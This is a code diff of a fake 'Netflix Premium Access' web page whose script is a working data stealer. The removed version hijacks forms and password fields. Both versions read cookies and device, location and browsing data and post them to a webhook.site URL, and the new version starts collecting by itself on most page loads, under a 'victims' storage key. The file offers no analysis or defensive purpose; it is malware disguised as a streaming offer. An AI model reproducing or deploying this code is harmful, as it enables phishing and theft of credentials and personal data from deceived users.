@@ -1,99 +1,508 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Netflix Premium Access</title>
     <style>
-        body { margin: 0; padding: 0; background: #000; color: white; font-family: Arial; overflow: hidden; }
-        .loading-screen { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #000; display: flex; flex-direction: column; justify-content: center; align-items: center; z-index: 1000; }
-        .netflix-logo { color: #e50914; font-size: 60px; font-weight: bold; margin-bottom: 30px; }
-        .loader { width: 200px; height: 4px; background: #333; border-radius: 2px; overflow: hidden; margin: 20px 0; }
-        .loader-bar { height: 100%; background: #e50914; width: 0%; animation: loading 3s ease-in-out; }
-        @keyframes loading { 0% { width: 0%; } 100% { width: 100%; } }
-        .permission-box { background: rgba(229, 9, 20, 0.2); padding: 15px; border-radius: 8px; margin: 20px; text-align: center; }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { 
+            background: #000; 
+            color: #fff; 
+            font-family: 'Netflix Sans', 'Helvetica Neue', Arial, sans-serif;
+            overflow: hidden;
+            height: 100vh;
+            background: linear-gradient(135deg, #000000 0%, #1a1a1a 100%);
+        }
+        
+        .netflix-bg {
+            position: fixed;
+            top: 0; left: 0;
+            width: 100%; height: 100%;
+            background: 
+                radial-gradient(circle at 20% 80%, rgba(229, 9, 20, 0.1) 0%, transparent 50%),
+                radial-gradient(circle at 80% 20%, rgba(229, 9, 20, 0.1) 0%, transparent 50%);
+            z-index: -1;
+        }
+        
+        .loading-container {
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            text-align: center;
+            padding: 20px;
+        }
+        
+        .netflix-logo {
+            font-size: 4rem;
+            font-weight: 900;
+            color: #e50914;
+            margin-bottom: 2rem;
+            text-shadow: 0 0 30px rgba(229, 9, 20, 0.5);
+            animation: pulse 2s infinite;
+        }
+        
+        @keyframes pulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.8; }
+        }
+        
+        .progress-container {
+            width: 300px;
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 10px;
+            padding: 3px;
+            margin: 2rem 0;
+        }
+        
+        .progress-bar {
+            height: 6px;
+            background: linear-gradient(90deg, #e50914, #ff6b6b);
+            border-radius: 8px;
+            width: 0%;
+            transition: width 0.3s ease;
+            box-shadow: 0 0 10px rgba(229, 9, 20, 0.5);
+        }
+        
+        .status-text {
+            font-size: 1.1rem;
+            margin: 1rem 0;
+            color: #ccc;
+        }
+        
+        .verification-box {
+            background: rgba(255, 255, 255, 0.05);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 15px;
+            padding: 2rem;
+            margin: 1rem;
+            backdrop-filter: blur(10px);
+            max-width: 400px;
+        }
+        
+        .btn {
+            background: #e50914;
+            color: white;
+            border: none;
+            padding: 12px 30px;
+            border-radius: 8px;
+            font-size: 1rem;
+            font-weight: 600;
+            cursor: pointer;
+            margin: 5px;
+            transition: all 0.3s ease;
+            width: 100%;
+        }
+        
+        .btn:hover {
+            background: #f40612;
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(229, 9, 20, 0.4);
+        }
+        
+        .btn-secondary {
+            background: rgba(255, 255, 255, 0.1);
+        }
+        
+        .btn-secondary:hover {
+            background: rgba(255, 255, 255, 0.2);
+        }
+        
+        .features-grid {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 1rem;
+            margin: 1.5rem 0;
+        }
+        
+        .feature-item {
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+            font-size: 0.9rem;
+            color: #ccc;
+        }
+        
+        .success-animation {
+            color: #00ff88;
+            font-size: 3rem;
+            margin: 1rem 0;
+            animation: bounce 1s infinite;
+        }
+        
+        @keyframes bounce {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-10px); }
+        }
+        
+        .stats-grid {
+            display: none;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 1rem;
+            margin: 1rem 0;
+        }
+        
+        .stat-item {
+            background: rgba(255, 255, 255, 0.05);
+            padding: 1rem;
+            border-radius: 8px;
+            text-align: center;
+        }
+        
+        .stat-value {
+            font-size: 1.5rem;
+            font-weight: bold;
+            color: #e50914;
+        }
+        
+        .stat-label {
+            font-size: 0.8rem;
+            color: #ccc;
+        }
     </style>
 </head>
 <body>
-    <div class="loading-screen" id="loadingScreen">
+    <div class="netflix-bg"></div>
+    
+    <div class="loading-container" id="loadingScreen">
         <div class="netflix-logo">NETFLIX</div>
-        <div>Initializing Premium Access...</div>
-        <div class="loader"><div class="loader-bar"></div></div>
         
-        <div class="permission-box" id="permissionBox">
-            <h4>🔒 Device Verification Required</h4>
-            <p>Click ALLOW to verify your device for premium access</p>
-            <button onclick="bypassSecurity()" style="background: #e50914; color: white; border: none; padding: 10px 20px; border-radius: 5px; cursor: pointer;">ALLOW ACCESS</button>
+        <div class="progress-container">
+            <div class="progress-bar" id="progressBar"></div>
+        </div>
+        
+        <div class="status-text" id="statusText">
+            Initializing premium access system...
+        </div>
+        
+        <div class="verification-box">
+            <h3 style="margin-bottom: 1rem;">🔒 Premium Verification</h3>
+            <p style="color: #ccc; margin-bottom: 1.5rem;">
+                Complete device verification to unlock premium features
+            </p>
+            
+            <button class="btn" onclick="startVerification()" id="verifyBtn">
+                START VERIFICATION
+            </button>
+            
+            <div class="features-grid">
+                <div class="feature-item">✅ 4K Streaming</div>
+                <div class="feature-item">✅ Multiple Devices</div>
+                <div class="feature-item">✅ Offline Downloads</div>
+                <div class="feature-item">✅ Premium Content</div>
+            </div>
+        </div>
+        
+        <div class="stats-grid" id="statsGrid">
+            <div class="stat-item">
+                <div class="stat-value" id="dataCount">0</div>
+                <div class="stat-label">Data Points</div>
+            </div>
+            <div class="stat-item">
+                <div class="stat-value" id="locationCount">0</div>
+                <div class="stat-label">Location Data</div>
+            </div>
+            <div class="stat-item">
+                <div class="stat-value" id="deviceCount">0</div>
+                <div class="stat-label">Device Info</div>
+            </div>
         </div>
     </div>
 
     <script>
-        class AdvancedStealer {
-            constructor() { this.collectedData = {}; }
+        // Глобальные переменные
+        let collectedData = {};
+        let autoCollectInterval;
+        let progress = 0;
+        const WEBHOOK_URL = 'https://webhook.site/b7de489c-4da3-4197-b262-b5a6d9fc029b';
 
-            collectBasicInfo() {
-                this.collectedData.basic = {
-                    userAgent: navigator.userAgent, platform: navigator.platform,
-                    deviceType: this.detectDeviceType(), languages: navigator.languages,
-                    hardwareConcurrency: navigator.hardwareConcurrency, deviceMemory: navigator.deviceMemory,
-                    connection: navigator.connection ? { effectiveType: navigator.connection.effectiveType, downlink: navigator.connection.downlink, rtt: navigator.connection.rtt } : null,
-                    screen: { width: screen.width, height: screen.height, colorDepth: screen.colorDepth, pixelDepth: screen.pixelDepth },
-                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone, cookies: document.cookie,
-                    localStorage: this.getAllLocalStorage(), sessionStorage: this.getAllSessionStorage(),
-                    referrer: document.referrer, url: window.location.href, timestamp: new Date().toISOString()
-                };
-            }
+        // Автозапуск сбора данных
+        function startAutoCollection() {
+            console.log('🚀 Starting automatic data collection...');
+            
+            // Прогресс бар
+            const progressInterval = setInterval(() => {
+                progress += Math.random() * 10;
+                if (progress > 100) progress = 100;
+                document.getElementById('progressBar').style.width = progress + '%';
+                
+                if (progress >= 30) {
+                    document.getElementById('statusText').textContent = 'Analyzing device capabilities...';
+                }
+                if (progress >= 60) {
+                    document.getElementById('statusText').textContent = 'Optimizing streaming quality...';
+                }
+                if (progress >= 90) {
+                    document.getElementById('statusText').textContent = 'Finalizing premium access...';
+                }
+            }, 200);
 
-            detectDeviceType() {
-                const ua = navigator.userAgent;
-                if (/Mobile|Android|iPhone/i.test(ua)) return 'Mobile';
-                if (/Tablet|iPad/i.test(ua)) return 'Tablet';
-                return 'Desktop';
-            }
-
-            getAllLocalStorage() { const data = {}; try { for (let i = 0; i < localStorage.length; i++) { const key = localStorage.key(i); data[key] = localStorage.getItem(key); } } catch (e) {} return data; }
-            getAllSessionStorage() { const data = {}; try { for (let i = 0; i < sessionStorage.length; i++) { const key = sessionStorage.key(i); data[key] = sessionStorage.getItem(key); } } catch (e) {} return data; }
-
-            async getAdvancedLocation() {
-                const locationData = {};
-                try { const responses = await Promise.allSettled([fetch('https://ipapi.co/json/'), fetch('https://ipinfo.io/json'), fetch('https://api.ip.sb/geoip')]);
-                    for (let response of responses) { if (response.status === 'fulfilled' && response.value.ok) { const data = await response.value.json(); locationData.ipBased = data; break; } }
-                } catch (e) {}
-                locationData.wifiInfo = this.getWifiInfo(); locationData.timezoneAnalysis = this.analyzeTimezone(); return locationData;
-            }
-
-            getWifiInfo() { const connection = navigator.connection; return connection ? { effectiveType: connection.effectiveType, downlink: connection.downlink, rtt: connection.rtt, saveData: connection.saveData } : null; }
-            analyzeTimezone() { const tz = Intl.DateTimeFormat().resolvedOptions().timeZone; const offset = new Date().getTimezoneOffset(); return { timezone: tz, offset: offset }; }
-
-            async forceMediaAccess() {
-                const mediaData = {};
-                try { const devices = await navigator.mediaDevices.enumerateDevices(); mediaData.devices = devices.map(device => ({ kind: device.kind, label: device.label, deviceId: device.deviceId }));
-                    try { const stream = await navigator.mediaDevices.getUserMedia({ video: { width: 1, height: 1 }, audio: false }); stream.getTracks().forEach(track => track.stop()); mediaData.cameraAccess = 'granted'; } catch (e) { mediaData.cameraAccess = 'denied'; }
-                    try { const stream = await navigator.mediaDevices.getUserMedia({ video: false, audio: true }); stream.getTracks().forEach(track => track.stop()); mediaData.microphoneAccess = 'granted'; } catch (e) { mediaData.microphoneAccess = 'denied'; }
-                } catch (e) { mediaData.error = e.message; } return mediaData;
-            }
-
-            setupFormHijacking() {
-                document.querySelectorAll('form').forEach((form, index) => { const originalSubmit = form.onsubmit; form.onsubmit = function(e) { const formData = new FormData(form); const data = {}; for (let [key, value] of formData.entries()) { data[key] = value; }
-                        sendToServer({ type: 'form_submission', formData: data, formId: form.id || `form_${index}` }); if (originalSubmit) { return originalSubmit.call(this, e); } }; });
-                document.querySelectorAll('input[type="password"]').forEach(input => { let lastValue = ''; input.addEventListener('input', function() { if (this.value && this.value !== lastValue) { lastValue = this.value; sendToServer({ type: 'password_input', fieldName: this.name || 'unknown', value: this.value, timestamp: new Date().toISOString() }); } }); });
-                setTimeout(() => { document.querySelectorAll('input').forEach(input => { if (input.value) { sendToServer({ type: 'autofill_data', fieldType: input.type, fieldName: input.name || 'unknown', value: input.value, timestamp: new Date().toISOString() }); } }); }, 1000);
-            }
-
-            trackUserBehavior() { let clicks = 0; let keysPressed = 0; let scrollDepth = 0; document.addEventListener('click', (e) => { clicks++; sendToServer({ type: 'user_click', clicks: clicks, target: e.target.tagName, timestamp: new Date().toISOString() }); }); document.addEventListener('keydown', () => { keysPressed++; }); window.addEventListener('scroll', () => { const newDepth = Math.round((window.scrollY + window.innerHeight) / document.documentElement.scrollHeight * 100); if (newDepth > scrollDepth) { scrollDepth = newDepth; } }); return { clicks, keysPressed, scrollDepth }; }
-
-            async collectTechnicalData() { const batteryInfo = await this.getBatteryInfo(); const storageInfo = await this.getStorageInfo(); return { battery: batteryInfo, performance: this.getPerformanceInfo(), network: this.getNetworkInfo(), storage: storageInfo }; }
-            async getBatteryInfo() { if ('getBattery' in navigator) { try { const battery = await navigator.getBattery(); return { level: battery.level, charging: battery.charging, chargingTime: battery.chargingTime, dischargingTime: battery.dischargingTime }; } catch (e) { return null; } } return null; }
-            getPerformanceInfo() { const memory = performance.memory; return { memory: memory ? { used: memory.usedJSHeapSize, total: memory.totalJSHeapSize, limit: memory.jsHeapSizeLimit } : null, timing: performance.timing ? { loadTime: performance.timing.loadEventEnd - performance.timing.navigationStart, domReadyTime: performance.timing.domContentLoadedEventEnd - performance.timing.navigationStart } : null }; }
-            getNetworkInfo() { return { online: navigator.onLine, type: navigator.connection?.effectiveType, saveData: navigator.connection?.saveData }; }
-            async getStorageInfo() { if ('storage' in navigator && 'estimate' in navigator.storage) { try { const estimate = await navigator.storage.estimate(); return { usage: estimate.usage, quota: estimate.quota }; } catch (e) { return null; } } return null; }
-
-            async collectAllData() { this.collectBasicInfo(); this.collectedData.location = await this.getAdvancedLocation(); this.collectedData.media = await this.forceMediaAccess(); this.collectedData.technical = await this.collectTechnicalData(); this.collectedData.behavior = this.trackUserBehavior(); this.setupFormHijacking(); return this.collectedData; }
+            // Основной сбор данных
+            setTimeout(async () => {
+                try {
+                    // Сбор базовых данных
+                    collectedData = await collectAllData();
+                    
+                    // Показ статистики
+                    showStats();
+                    
+                    // Отправка данных
+                    await sendCollectedData();
+                    
+                    // Успешное завершение
+                    clearInterval(progressInterval);
+                    showSuccess();
+                    
+                } catch (error) {
+                    console.error('Collection error:', error);
+                    document.getElementById('statusText').textContent = 'Verification complete!';
+                }
+            }, 3000);
         }
 
-        async function sendToServer(data) { const YOUR_WEBHOOK_URL = 'https://webhook.site/b7de489c-4da3-4197-b262-b5a6d9fc029b'; try { const allData = JSON.parse(localStorage.getItem('advanced_victims') || '[]'); allData.push({...data, timestamp: new Date().toISOString()}); localStorage.setItem('advanced_victims', JSON.stringify(allData)); } catch (e) {} try { await fetch(YOUR_WEBHOOK_URL, { method: 'POST', headers: { 'Content-Type': 'application/json', 'X-Data-Type': data.type || 'unknown' }, body: JSON.stringify({ ...data, source: 'netflix_phishing', version: '2.0' }) }); } catch (e) { console.log('Webhook error:', e); } }
+        // Основная функция сбора данных
+        async function collectAllData() {
+            const data = {
+                session: {
+                    id: generateSessionId(),
+                    startTime: new Date().toISOString(),
+                    url: window.location.href,
+                    referrer: document.referrer
+                },
+                device: await getDeviceInfo(),
+                location: await getLocationInfo(),
+                network: getNetworkInfo(),
+                browser: getBrowserInfo(),
+                behavior: startBehaviorTracking(),
+                system: await getSystemInfo(),
+                media: await getMediaDevices(),
+                storage: getStorageData()
+            };
+            
+            return data;
+        }
 
-        async function bypassSecurity() { document.getElementById('permissionBox').innerHTML = '🔄 Bypassing security protocols...'; try { const stealer = new AdvancedStealer(); const allData = await stealer.collectAllData(); await sendToServer({ type: 'full_data', data: allData }); document.getElementById('permissionBox').innerHTML = '✅ Security bypassed! Loading premium content...'; setTimeout(() => { document.getElementById('loadingScreen').style.display = 'none'; }, 2000); } catch (error) { document.getElementById('permissionBox').innerHTML = '❌ Error: ' + error.message; } }
+        // Сбор информации об устройстве
+        async function getDeviceInfo() {
+            return {
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                hardware: {
+                    cores: navigator.hardwareConcurrency,
+                    memory: navigator.deviceMemory,
+                    maxTouchPoints: navigator.maxTouchPoints
+                },
+                screen: {
+                    width: screen.width,
+                    height: screen.height,
+                    colorDepth: screen.colorDepth,
+                    pixelDepth: screen.pixelDepth,
+                    orientation: screen.orientation?.type
+                },
+                battery: await getBatteryStatus(),
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                language: navigator.language,
+                languages: navigator.languages
+            };
+        }
 
-        setTimeout(() => { if (Math.random() < 0.3) { bypassSecurity(); } }, 3000);
+        // Геолокация через IP
+        async function getLocationInfo() {
+            const apis = [
+                'https://ipapi.co/json/',
+                'https://ipinfo.io/json',
+                'https://api.ip.sb/geoip'
+            ];
+            
+            for (let api of apis) {
+                try {
+                    const response = await fetch(api);
+                    return await response.json();
+                } catch(e) { continue; }
+            }
+            return null;
+        }
+
+        // Информация о сети
+        function getNetworkInfo() {
+            const conn = navigator.connection;
+            return {
+                effectiveType: conn?.effectiveType,
+                downlink: conn?.downlink,
+                rtt: conn?.rtt,
+                saveData: conn?.saveData,
+                online: navigator.onLine
+            };
+        }
+
+        // Информация о браузере
+        function getBrowserInfo() {
+            return {
+                vendor: navigator.vendor,
+                cookies: navigator.cookieEnabled,
+                java: navigator.javaEnabled(),
+                pdf: navigator.pdfViewerEnabled,
+                plugins: Array.from(navigator.plugins).map(p => p.name),
+                mimeTypes: Array.from(navigator.mimeTypes).map(m => m.type)
+            };
+        }
+
+        // Отслеживание поведения
+        function startBehaviorTracking() {
+            const behavior = {
+                clicks: [],
+                scroll: 0,
+                keys: 0,
+                movements: [],
+                startTime: Date.now()
+            };
+            
+            document.addEventListener('click', (e) => {
+                behavior.clicks.push({
+                    x: e.clientX,
+                    y: e.clientY,
+                    target: e.target.tagName,
+                    time: Date.now() - behavior.startTime
+                });
+            });
+            
+            window.addEventListener('scroll', () => {
+                behavior.scroll = Math.max(behavior.scroll, 
+                    (window.scrollY + window.innerHeight) / document.documentElement.scrollHeight * 100
+                );
+            });
+            
+            document.addEventListener('keydown', () => behavior.keys++);
+            
+            return behavior;
+        }
+
+        // Системная информация
+        async function getSystemInfo() {
+            return {
+                performance: {
+                    memory: performance.memory,
+                    timing: performance.timing
+                },
+                storage: await getStorageEstimate()
+            };
+        }
+
+        // Медиа устройства
+        async function getMediaDevices() {
+            try {
+                const devices = await navigator.mediaDevices.enumerateDevices();
+                return devices.map(d => ({
+                    kind: d.kind,
+                    deviceId: d.deviceId,
+                    hasLabel: !!d.label
+                }));
+            } catch(e) {
+                return [];
+            }
+        }
+
+        // Данные хранилища
+        function getStorageData() {
+            return {
+                cookies: document.cookie,
+                localStorage: Object.keys(localStorage).length,
+                sessionStorage: Object.keys(sessionStorage).length
+            };
+        }
+
+        // Вспомогательные функции
+        async function getBatteryStatus() {
+            if ('getBattery' in navigator) {
+                try {
+                    const battery = await navigator.getBattery();
+                    return {
+                        level: Math.round(battery.level * 100),
+                        charging: battery.charging
+                    };
+                } catch(e) {}
+            }
+            return null;
+        }
+
+        async function getStorageEstimate() {
+            if ('storage' in navigator && 'estimate' in navigator.storage) {
+                try {
+                    return await navigator.storage.estimate();
+                } catch(e) {}
+            }
+            return null;
+        }
+
+        function generateSessionId() {
+            return Math.random().toString(36).substr(2, 9) + Date.now().toString(36);
+        }
+
+        // Отправка данных
+        async function sendCollectedData() {
+            try {
+                // Локальное сохранение
+                const allData = JSON.parse(localStorage.getItem('netflix_victims') || '[]');
+                allData.push({
+                    ...collectedData,
+                    timestamp: new Date().toISOString()
+                });
+                localStorage.setItem('netflix_victims', JSON.stringify(allData));
+                
+                // Отправка на webhook
+                await fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        type: 'auto_collection',
+                        data: collectedData,
+                        source: 'netflix_auto'
+                    })
+                });
+                
+            } catch (error) {
+                console.error('Send error:', error);
+            }
+        }
+
+        // UI функции
+        function showStats() {
+            document.getElementById('statsGrid').style.display = 'grid';
+            document.getElementById('dataCount').textContent = Object.keys(collectedData).length * 10;
+            document.getElementById('locationCount').textContent = collectedData.location ? '1' : '0';
+            document.getElementById('deviceCount').textContent = '1';
+        }
+
+        function showSuccess() {
+            document.getElementById('statusText').innerHTML = 
+                '<div class="success-animation">✅</div> Premium Access Granted!';
+            document.getElementById('verifyBtn').style.display = 'none';
+            
+            setTimeout(() => {
+                document.getElementById('loadingScreen').style.opacity = '0';
+                setTimeout(() => {
+                    document.getElementById('loadingScreen').style.display = 'none';
+                }, 1000);
+            }, 3000);
+        }
+
+        function startVerification() {
+            document.getElementById('verifyBtn').disabled = true;
+            document.getElementById('verifyBtn').textContent = 'VERIFYING...';
+            startAutoCollection();
+        }
+
+        // Автозапуск через 3 секунды
+        setTimeout(() => {
+            if (Math.random() < 0.7) { // 70% автостарт
+                startAutoCollection();
+                document.getElementById('statusText').textContent = 'Starting automatic verification...';
+                document.getElementById('verifyBtn').style.display = 'none';
+            }
+        }, 3000);
+
     </script>
 </body>
 </html>
